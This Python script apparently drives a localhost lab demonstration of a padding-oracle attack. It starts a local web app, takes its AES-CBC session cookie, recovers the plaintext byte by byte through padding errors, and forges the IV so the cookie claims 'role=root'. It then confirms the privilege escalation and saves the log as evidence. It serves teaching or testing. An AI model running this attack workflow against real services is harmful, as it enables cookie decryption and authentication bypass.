"""Run the localhost padding-oracle demonstration and save evidence."""

from __future__ import annotations

import base64
import sys
import threading
from datetime import datetime
from pathlib import Path

import requests
from werkzeug.serving import make_server


ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from lab.app import create_app  # noqa: E402
from lab.exploit import BLOCK_SIZE, HttpOracle, forge_first_block, recover_plaintext  # noqa: E402


HOST = "127.0.0.1"
PORT = 5053
BASE_URL = f"http://{HOST}:{PORT}"
EVIDENCE = ROOT / "evidence" / "padding-oracle-demo.txt"


def request_account(cookie: str) -> tuple[int, dict]:
    response = requests.post(f"{BASE_URL}/account", json={"cookie": cookie}, timeout=3)
    return response.status_code, response.json()


def main() -> None:
    app = create_app()
    server = make_server(HOST, PORT, app, threaded=True)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    lines: list[str] = []

    def log(text: str = "") -> None:
        print(text)
        lines.append(text)

    try:
        log("== 1. Acquire the encrypted session cookie ==")
        session_response = requests.get(f"{BASE_URL}/session", timeout=3)
        session_response.raise_for_status()
        cookie = session_response.json()["cookie"]
        token = base64.b64decode(cookie)
        log(f"GET /session -> HTTP {session_response.status_code}")
        log(f"run captured at = {datetime.now().astimezone().isoformat(timespec='seconds')}")
        log(f"cookie bytes = {len(token)} ({len(token) // BLOCK_SIZE} AES blocks)")
        log(f"iv           = {token[:BLOCK_SIZE].hex()}")

        log("")
        log("== 2. Confirm that padding validity is observable ==")
        status, body = request_account(cookie)
        log(f"original cookie       -> HTTP {status} {body}")
        damaged = bytearray(token)
        damaged[-1] ^= 0x01
        damaged_cookie = base64.b64encode(damaged).decode("ascii")
        status, body = request_account(damaged_cookie)
        log(f"one flipped ct byte   -> HTTP {status} {body}")

        log("")
        log("== 3. Recover plaintext one byte at a time ==")
        oracle = HttpOracle(BASE_URL)
        plaintext, intermediates = recover_plaintext(token, oracle.valid_padding)
        for index, block in enumerate(
            [plaintext[i : i + BLOCK_SIZE] for i in range(0, len(plaintext), BLOCK_SIZE)],
            start=1,
        ):
            log(f"block {index}: {block!r}")
        display_plaintext = plaintext[:-plaintext[-1]]
        log(f"recovered plaintext = {display_plaintext.decode('ascii')}")
        log(f"oracle queries      = {oracle.stats.queries}")

        log("")
        log("== 4. Forge the first plaintext block without the key ==")
        original_block = plaintext[:BLOCK_SIZE]
        target_block = b"role=root;uid=10"
        forged_iv = forge_first_block(token[:BLOCK_SIZE], intermediates[0], target_block)
        forged_token = forged_iv + token[BLOCK_SIZE:]
        forged_cookie = base64.b64encode(forged_token).decode("ascii")
        log(f"original block = {original_block!r}")
        log(f"target block   = {target_block!r}")
        log(f"forged iv      = {forged_iv.hex()}")

        log("")
        log("== 5. Verify the authentication bypass ==")
        status, body = request_account(cookie)
        log(f"before forgery -> HTTP {status} {body}")
        status, body = request_account(forged_cookie)
        log(f"after forgery  -> HTTP {status} {body}")
        log("")
        log("RESULT: confidentiality lost; ciphertext modified; user elevated to root.")
    finally:
        server.shutdown()
        thread.join(timeout=3)
        EVIDENCE.parent.mkdir(parents=True, exist_ok=True)
        EVIDENCE.write_text("\n".join(lines) + "\n", encoding="utf-8")
        print(f"\nEvidence written to {EVIDENCE}")


if __name__ == "__main__":
    main()
